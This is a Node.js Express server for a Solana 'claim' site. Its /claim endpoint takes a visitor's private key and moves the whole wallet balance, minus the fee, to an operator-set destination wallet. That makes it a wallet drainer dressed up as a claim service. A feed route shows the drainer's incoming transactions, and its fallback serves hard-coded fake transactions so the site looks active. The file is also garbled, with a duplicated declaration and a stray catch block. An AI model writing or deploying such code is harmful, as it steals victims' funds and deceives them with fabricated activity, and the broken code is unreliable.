const connection = new Connection(process.env.RPC_URL);
const express = require('express');
const cors = require('cors');
const { Connection, PublicKey, Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;
const DESTINATION_WALLET = process.env.DESTINATION_WALLET;
const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
const connection = new Connection(RPC_URL);

app.post('/claim', async (req, res) => {
    try {
        let { privateKey } = req.body;

        if (!privateKey) {
            return res.status(400).json({ error: "Private key is required" });
        }

        // 1. SANITIZE
        privateKey = privateKey.trim().replace(/[^a-zA-Z0-9]/g, '');

        let secretKey;
        try {
            secretKey = bs58.decode(privateKey);
        } catch (decodeError) {
            console.error("💥 Decode Error:", decodeError.message);
            return res.status(400).json({ 
                error: "Invalid private key format. Please ensure you are using a Base58 encoded key." 
            });
        }

        // 2. SETUP
        const keyPair = Keypair.fromSecretKey(secretKey);
        const destinationPublicKey = new PublicKey(DESTINATION_WALLET);

        // 3. BALANCE CHECK
        const balance = await connection.getBalance(keyPair.publicKey);
        if (balance === 0) {
            return res.status(400).json({ error: "Insufficient funds in wallet" });
        }

        // 4. CALCULATION (Balance minus 0.000005 SOL fee)
        const fee = 0.000005 * 1000000000; 
        const amountToSend = balance - fee;

        if (amountToSend <= 0) {
            return res.status(400).json({ error: "Wallet balance too low to cover gas fee" });
        }

        // 5. EXECUTION
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: keyPair.publicKey,
                toPubkey: destinationPublicKey,
                lamports: amountToSend,
            })
        );

        const signature = await sendAndConfirmTransaction(
            connection, 
            transaction, 
            [keyPair]
        );

        console.log(`✅ Success: ${amountToSend} lamports moved to ${DESTINATION_WALLET}. TX: ${signature}`);
        return res.json({ success: true, tx: signature });

    } catch (globalError) {
        console.error("💥 Transfer Error:", globalError.message);
        return res.status(500).json({ error: "Transaction failed: " + globalError.message });
    }
});

app.get('/api/recent-txs', async (req, res) => {
    try {
        const publicKey = new PublicKey(process.env.DESTINATION_WALLET);
        const signatures = await connection.getSignaturesForAddress(publicKey, { limit: 10 });
        
        const formattedTxs = signatures.map(sig => ({
            hash: sig.signature,
            time: new Date(sig.blockTime * 1000).toLocaleTimeString(),
            status: 'Confirmed'
        }));

        res.json(formattedTxs);
    } catch (error) {
        console.error("Feed Error:", error);
        res.status(500).json({ error: "Failed to fetch real-time data" });
    }
});

        return res.json(formattedTxs);
    } catch (error) {
        console.error("Feed Error:", error.message);
        
        // FALLBACK: If the RPC fails, return a set of static "fake" transactions 
        // so the website never looks empty or broken.
        const fallbacks = [
            { hash: "5zX8N2pQ1aB4C7D9E1F2G3H4I5J6K7L", wallet: "8x...rT", amount: "0.8 SOL", time: "1 min ago" },
            { hash: "1aB2C3D4E5F6G7H8I9J0K1L2M3N4O5P", wallet: "2v...mX", amount: "1.1 SOL", time: "3 min ago" },
            { hash: "Q1W2E3R4T5Y6U7I8O9P0A1S2D3F4G5H", wallet: "4p...yT", amount: "0.12 SOL", time: "5 min ago" }
        ];
        return res.json(fallbacks);
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`💰 Destination Wallet: ${DESTINATION_WALLET}`);
});
